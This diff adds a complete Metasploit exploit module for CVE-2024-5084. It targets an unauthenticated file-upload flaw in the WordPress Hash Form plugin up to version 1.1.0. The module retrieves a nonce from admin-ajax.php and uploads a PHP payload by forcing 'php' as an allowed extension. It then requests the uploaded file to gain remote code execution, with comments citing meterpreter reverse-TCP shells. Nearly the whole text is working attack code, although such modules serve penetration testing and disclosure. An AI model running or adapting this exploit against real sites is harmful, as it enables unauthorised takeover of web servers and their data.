@@ -1,0 +1,174 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Payload::Php
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Wordpress
+
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Hash Form Plugin RCE',
+        'Description' => %q{
+          The Hash Form – Drag & Drop Form Builder plugin for WordPress suffers from a critical vulnerability
+          due to missing file type validation in the file_upload_action function. This vulnerability exists
+          in all versions up to and including 1.1.0. Unauthenticated attackers can exploit this flaw to upload arbitrary
+          files, including PHP scripts, to the server, potentially allowing for remote code execution on the affected
+          WordPress site. This module targets multiple platforms by adapting payload delivery and execution based on the
+          server environment.
+        },
+        'Author' => [
+          'Francesco Carlucci', # Vulnerability discovery
+          'Valentin Lobstein'   # Metasploit module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['CVE', '2024-5084'],
+          ['URL', 'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hash-form/hash-form-drag-drop-form-builder-110-unauthenticated-arbitrary-file-upload-to-remote-code-execution'],
+        ],
+        'Platform' => ['php', 'unix', 'linux', 'win'],
+        'Arch' => [ARCH_PHP, ARCH_CMD],
+        'Targets' => [
+          [
+            'PHP In-Memory', {
+              'Platform' => 'php',
+              'Arch' => ARCH_PHP
+              # tested with php/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Unix/Linux Command Shell', {
+              'Platform' => ['unix', 'linux'],
+              'Arch' => ARCH_CMD
+              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Windows Command Shell', {
+              'Platform' => 'win',
+              'Arch' => ARCH_CMD
+              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        'Privileged' => false,
+        'DisclosureDate' => '2024-05-23',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+      )
+  end
+
+  def check
+    return CheckCode::Unknown('WordPress does not appear to be online.') unless wordpress_and_online?
+
+    plugin_check_code = check_plugin_version_from_readme('hash-form', '1.1.1')
+
+    if plugin_check_code.code == CheckCode::Unknown.code
+      return CheckCode::Unknown('Hash Form plugin does not appear to be installed.')
+    end
+
+    return CheckCode::Detected('Hash Form plugin is installed but the version is unknown.') if plugin_check_code.code == CheckCode::Detected.code
+
+    plugin_version = plugin_check_code.details[:version]
+    return CheckCode::Safe("Hash Form plugin is version: #{plugin_version}, which is not vulnerable.") unless plugin_check_code.code == CheckCode::Appears.code
+
+    print_good("Detected Hash Form plugin version: #{plugin_version}")
+    CheckCode::Appears
+  end
+
+  def exploit
+    print_status('Attempting to retrieve nonce from the target...')
+    nonce = get_nonce
+
+    fail_with(Failure::NoTarget, 'Failed to retrieve the nonce necessary for file upload. The target may not be vulnerable or the Hash Form plugin might not be active.') unless nonce
+
+    print_good("Nonce retrieved: #{nonce}")
+    print_status('Uploading PHP payload using the retrieved nonce...')
+
+    file_url = upload_php_file(nonce)
+    fail_with(Failure::UnexpectedReply, 'Failed to upload the PHP payload. Check file permissions and server settings.') unless file_url
+
+    print_good("PHP payload uploaded successfully to #{file_url}")
+    trigger_payload(file_url)
+  end
+
+  def get_nonce
+    uri = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => uri,
+      'vars_get' => {
+        'action' => 'hashform_preview',
+        'form' => 1
+      }
+    })
+
+    return nil unless res && res.code == 200
+
+    script_content = res.get_html_document.xpath('//script[@id="frontend-js-extra"]').text
+    return nil unless script_content
+
+    nonce_match = script_content.match(/"ajax_nounce":"([a-f0-9]+)"/)
+    nonce_match ? nonce_match[1] : nil
+  end
+
+  def php_exec_cmd(encoded_payload)
+    dis = '$' + Rex::Text.rand_text_alpha(rand(4..7))
+    encoded_clean_payload = Rex::Text.encode_base64(encoded_payload)
+
+    shell = <<-END_OF_PHP_CODE
+      #{php_preamble(disabled_varname: dis)}
+      $c = base64_decode("#{encoded_clean_payload}");
+      #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
+    END_OF_PHP_CODE
+
+    return Rex::Text.compress(shell)
+  end
+
+  def upload_php_file(nonce)
+    file_content = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
+    file_name = "#{Rex::Text.rand_text_alpha_lower(8)}.php"
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
+      'ctype' => 'application/octet-stream',
+      'vars_get' => {
+        'action' => 'hashform_file_upload_action',
+        'file_uploader_nonce' => nonce,
+        'allowedExtensions[0]' => 'php',
+        'sizeLimit' => 1048576,
+        'qqfile' => file_name
+      },
+      'data' => file_content
+    })
+
+    if res && res.code == 200
+      json_response = res.get_json_document
+      return json_response['url'] if json_response && json_response['url']
+    end
+    nil
+  end
+
+  def trigger_payload(url)
+    print_status('Triggering the payload...')
+    uri = URI.parse(url)
+    send_request_cgi({
+      'method' => 'GET',
+      'uri' => uri.path
+    })
+  end
+end
